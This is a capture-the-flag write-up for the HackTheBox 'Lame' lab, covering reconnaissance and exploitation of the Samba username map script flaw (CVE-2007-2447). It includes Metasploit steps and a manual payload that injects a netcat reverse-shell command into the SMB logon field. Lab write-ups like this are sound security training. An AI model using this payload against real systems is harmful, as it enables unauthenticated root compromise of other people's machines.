# HackTheBox — Lame

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Exploitation / CVE  
**Status:** Retired  

---

## Summary

Lame is one of the oldest machines on HackTheBox and a great starting point for beginners. It exposes a vulnerable version of Samba (CVE-2007-2447) that allows unauthenticated remote code execution via a username map script injection. No user foothold is required — the exploit lands directly as root.

---

## Reconnaissance

### Nmap Full Port Scan

```bash
nmap -sC -sV -oA nmap/lame 10.10.10.3
```

**Results:**

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

- FTP shows **vsftpd 2.3.4** — known backdoor, but it's a rabbit hole here (the backdoor requires a specific trigger that doesn't fire on this box)
- Samba **3.0.20** is the real target

---

## Enumeration

### FTP Anonymous Login

```bash
ftp 10.10.10.3
# Login: anonymous / anonymous
# Nothing useful in the FTP root
```

### SMB Enumeration

```bash
smbclient -L //10.10.10.3 -N
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service
ADMIN$          IPC       IPC Service
```

The `tmp` share is accessible anonymously:

```bash
smbclient //10.10.10.3/tmp -N
```

---

## Exploitation

### CVE-2007-2447 — Samba Username Map Script

Samba versions 3.0.0 through 3.0.25rc3 allow remote code execution via shell metacharacters in the `username` field when the `username map script` option is enabled in `smb.conf`.

**Metasploit (Quick Route):**

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.X
run
```

**Manual Exploitation (No Metasploit):**

```bash
# Open a listener
nc -lvnp 4444

# Trigger the vulnerability via smbclient
smbclient //10.10.10.3/tmp -N
logon "/=`nohup nc -e /bin/sh 10.10.14.X 4444`"
```

This sends a shell metacharacter sequence in the login field, causing the server to execute our reverse shell command.

---

## Shell & Flags

The shell lands as **root** immediately:

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

### User Flag

```bash
cat /home/makis/user.txt
# [REDACTED]
```

### Root Flag

```bash
cat /root/root.txt
# [REDACTED]
```

---

## Key Takeaways

- **Samba 3.0.20 is vulnerable** to CVE-2007-2447 — always check Samba versions during enumeration
- **vsftpd 2.3.4** is another known backdoor but was a red herring here — always verify exploit conditions
- Unauthenticated RCE directly to root is the best-case scenario in a pentest
- Always run `smbclient -L` and check for anonymous share access

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning & version detection |
| smbclient | SMB share enumeration & exploitation |
| Metasploit | Alternative exploitation route |
| netcat | Reverse shell listener |
